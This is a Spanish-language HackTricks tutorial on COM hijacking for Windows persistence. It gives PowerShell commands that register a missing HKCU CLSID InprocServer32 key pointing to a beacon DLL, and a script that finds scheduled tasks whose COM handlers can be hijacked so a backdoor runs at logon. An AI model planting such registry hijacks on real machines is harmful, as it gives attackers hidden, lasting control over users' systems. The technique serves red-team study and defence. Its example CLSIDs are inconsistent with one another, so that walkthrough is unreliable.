# Secuestro de COM

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

### Buscando componentes COM inexistentes

Dado que los valores de HKCU pueden ser modificados por los usuarios, el **Secuestro de COM** podría ser utilizado como un **mecanismo persistente**. Usando `procmon`, es fácil encontrar registros COM buscados que no existen y que un atacante podría crear para persistir. Filtros:

* Operaciones de **RegOpenKey**.
* donde el _Resultado_ sea **NOMBRE NO ENCONTRADO**.
* y el _Ruta_ termine con **InprocServer32**.

Una vez que hayas decidido qué COM inexistente suplantar, ejecuta los siguientes comandos. _Ten cuidado si decides suplantar un COM que se carga cada pocos segundos, ya que podría ser excesivo._&#x20;
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componentes COM del Programador de tareas susceptibles de secuestro

Las Tareas de Windows utilizan Disparadores Personalizados para llamar a objetos COM y debido a que se ejecutan a través del Programador de tareas, es más fácil predecir cuándo se van a activar.

<pre class="language-powershell"><code class="lang-powershell"># Mostrar CLSIDs COM
$Tareas = Get-ScheduledTask

foreach ($Tarea in $Tareas)
{
if ($Tarea.Actions.ClassId -ne $null)
{
if ($Tarea.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Tarea.Principal.GroupId -eq $usersGroup)
{
Write-Host "Nombre de la Tarea: " $Tarea.TaskName
Write-Host "Ruta de la Tarea: " $Tarea.TaskPath
Write-Host "CLSID: " $Tarea.Actions.ClassId
Write-Host
}
}
}
}

# Resultado de ejemplo:
<strong># Nombre de la Tarea:  Ejemplo
</strong># Ruta de la Tarea:  \Microsoft\Windows\Ejemplo\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [más resultados similares...]</code></pre>

Al revisar la salida, puedes seleccionar una que se va a ejecutar **cada vez que un usuario inicie sesión**, por ejemplo.

Ahora, al buscar el CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** en **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** y en HKLM y HKCU, generalmente descubrirás que el valor no existe en HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Entonces, simplemente puedes crear la entrada HKCU y cada vez que el usuario inicie sesión, tu puerta trasera se activará.

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
